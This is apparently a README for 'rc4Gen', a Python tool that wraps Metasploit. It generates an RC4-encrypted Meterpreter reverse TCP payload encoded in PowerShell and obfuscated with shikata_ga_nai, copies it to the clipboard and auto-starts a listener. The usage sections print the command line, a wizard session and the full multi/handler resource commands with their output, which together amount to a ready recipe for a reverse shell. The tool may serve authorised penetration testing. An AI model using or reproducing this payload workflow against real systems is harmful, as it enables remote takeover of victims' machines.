# rc4Gen
    This is a Unicorn like script that...
    Generates a MSF Reverse TCP RC4 payload encoded in Powershell.
    Additionally, it will copy the payload to your clipboard and automagically launch the MSF listener.
    rc4Gen.py supports both command-line parameters and a wizard with interactive menu driven options.
***
Installation:

    git clone 
    cd rc4Gen
    python rc4Gen.py

***
Default Values:    
    
***
Usage(CLI):

    python rc4Gen.py --lhost=10.37.242.7 --lport=445 --verbose=on -e on
***
Usage(Wizard):

    External IP: 100.255.255.255
    Internal IP: 10.37.242.7

    You did not specifiy the LHOST, wizard menu has launched:

    Enter LHOST for payload[100.255.255.255]:10.37.242.7
    ENTERED: "10.37.242.7"

    Enter LPORT for payload[443]:
    ENTERED: "443"

    Enter RC4PASSWORD for payload[rc4M4g1c]:
    ENTERED: "rc4M4g1c"

    TIP: Verbosity [ON] will print payload to STDOUT.
    TIP: Verbosity [OFF] will copy payload to Clipboard.
    Verbosity[OFF]:
    ENTERED: "OFF"

    No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    No Arch selected, selecting Arch: x86 from the payload
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 421 (iteration=0)
    x86/shikata_ga_nai chosen with final size 421
    Payload size: 421 bytes
    Saved as: rc4_payload.ps1

    Payload Copied to Clipboard:

    PAYLOAD: reverse_tcp_rc4
    LHOST: 10.37.242.7
    LPORT: 443
    RC4PASSWORD: rc4M4g1c
    TIP: Listener [ON] will automagically launch a MSF listener.
    listener[ON]:
    ENTERED: "ON"

    [*] Processing rc4_listener.rc for ERB directives.
    resource (rc4_listener.rc)> use multi/handler
    resource (rc4_listener.rc)> set PAYLOAD windows/meterpreter/reverse_tcp_rc4
    PAYLOAD => windows/meterpreter/reverse_tcp_rc4
    resource (rc4_listener.rc)> set LHOST 10.37.242.7
    LHOST => 10.37.242.7
    resource (rc4_listener.rc)> set LPORT 443
    LPORT => 443
    resource (rc4_listener.rc)> set Rc4PASSWORD rc4M4g1c
    Rc4PASSWORD => rc4M4g1c
    resource (rc4_listener.rc)> set ExitOnSession false
    ExitOnSession => false
    resource (rc4_listener.rc)> set AutoRunScript multi_console_command -rcautorun_commands.rc
    AutoRunScript => multi_console_command -rcautorun_commands.rc
    resource (rc4_listener.rc)> exploit -j -z
    [*] Exploit running as background job.

    [*] Started reverse TCP handler on 10.37.242.7:443 
    [*] Starting the payload handler...
    msf exploit(handler) > exit
        ...
***
To Do:

    Add try/expect statment for the msfpro/msvenom alternate path
    Create help function.
